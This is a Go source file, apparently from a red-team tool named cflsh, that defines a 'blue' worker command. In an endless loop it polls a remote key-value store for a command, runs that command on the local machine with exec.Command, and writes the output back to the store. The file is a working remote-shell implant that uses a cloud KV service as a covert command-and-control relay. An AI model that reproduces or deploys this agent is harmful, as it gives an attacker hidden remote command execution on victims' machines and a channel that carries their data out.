package cmd

import (
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/dsnezhkov/cflsh/common"
)

func init() {
	rootCmd.AddCommand(blueCmd)
}

var blueCmd = &cobra.Command{
	Use:   "blue",
	Short: "",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		blueDriver(cmd, args)
	},
}

func blueDriver(cmd *cobra.Command, args []string) {

	nameSpace := common.NameSpace{
		Name: "test",
		UUID: "9b5e2ff9353f4f618a29193d2facc01b",
	}

	cmdPayloadNullify := []byte("")



	for {

		time.Sleep(common.WorkerInterval * time.Second)

		CmdRRequest := common.CmdKVRRequest{
			NameSpace: nameSpace,
			CmdKName:  common.CmdBucketKeyPrefix,
		}

		CmdWRequest := common.CmdKVWRequest{
			NameSpace: nameSpace,
			CmdKName:     common.CmdBucketKeyPrefix,
			CmdPayload:   cmdPayloadNullify,
		}

		OutWRequest := common.OutKVWRequest{
			NameSpace:  nameSpace,
		}

		// Get bucket name from worker KV index
		cmdPayloadBucket, err := common.ReadCmdKV(CmdRRequest)
		if err != nil {
			fmt.Printf("Error getting bucket name: %s\n", err)
		}

		// Empty / waiting?
		if len(cmdPayloadBucket) == 0 ||
			(string(cmdPayloadBucket )== common.CmdBucketKeyPrefix) {
			fmt.Printf(".")
			continue
		}else{
			fmt.Printf("Got name of bucket: %s\n", cmdPayloadBucket)

			CmdRRequest.CmdKName = string(cmdPayloadBucket)
			cmdPayload, err := common.ReadCmdKV(CmdRRequest)
			if err != nil {
				fmt.Printf("Error getting cmd payload: %s\n", err)
			}
			fmt.Printf("Got payload: %s\n", cmdPayload)
			fmt.Printf("Executing command\n")

			pcommand := strings.Split(string(cmdPayload), " ")

			pcmd := exec.Command(pcommand[0], pcommand[1:]...)
			stdoutStderr, err := pcmd.CombinedOutput()
			if err != nil {
				fmt.Printf("Error: %s\n", err.Error())
				OutWRequest.OutPayload = []byte(err.Error())
			} else {
				fmt.Printf("OK: payload len %d\n", len(stdoutStderr))
				OutWRequest.OutPayload = stdoutStderr
			}

			// Get response bucket name
			outputPayloadBucket := strings.ReplaceAll(
					string(cmdPayloadBucket), "command", "output")

			fmt.Printf("Setting up response bucket: %s\n", outputPayloadBucket)

			// Write command request payload
			OutWRequest.OutKName = outputPayloadBucket

			resp, err := common.WriteOutKV(OutWRequest)
			if err != nil {
				fmt.Printf("Error in WriteOutKV worker: %s\n", err)
				fmt.Printf("%+v", resp)
			}

			// Wire up bucket in KV index
			OutWRequest.OutKName = common.OutBucketKeyPrefix
			OutWRequest.OutPayload = []byte(outputPayloadBucket)
			resp, err = common.WriteOutKV(OutWRequest)
			if err != nil {
				fmt.Printf("Error in WriteOutKV worker: %s\n", err)
				fmt.Printf("%+v", resp)
			}

			// Signal complete command by removing bucket pointer from KV index
			resp, err = common.WriteCmdKV(CmdWRequest)
			if err != nil {
				fmt.Printf("Error writing cmd bucket pointer: %s\n", err)
				fmt.Printf("%+v\n", resp)
			}
		}
	}
}

